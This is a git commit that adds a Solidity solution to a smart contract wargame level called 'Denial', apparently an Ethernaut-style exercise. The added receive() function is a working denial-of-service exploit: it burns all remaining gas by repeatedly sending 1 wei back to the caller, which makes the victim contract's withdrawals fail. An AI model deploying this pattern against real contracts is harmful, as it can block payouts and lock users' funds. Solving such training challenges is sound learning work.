5b149875d2166e12a2c8dd94c1216ee48be0afb6
Francesco Colleoni <wolfra@gmail.com>
2022-07-08 15:26:14 +0200

    Adds solution for level 7.

--- contracts/7. Denial/AttackingDenial.sol
+++ contracts/7. Denial/AttackingDenial.sol
@@ -9,5 +9,14 @@ contract AttackingDenial {
         contractAddress = _contractAddress;
     }
 
-    //Code me!
+    receive() external payable {
+        // This contract will receive 1% of the victim's balance.
+        // Take the remaining gas and treat is as a quantity of wei,
+        // then send these wei back to the sender, one by one.
+        // This will cause an "out of gas" exception, aborting the transaction.
+        uint gas = gasleft();
+        for (uint256 i = 0; i <= gas; i++) {
+            msg.sender.call{value: 1}("");
+        }
+    }
 }
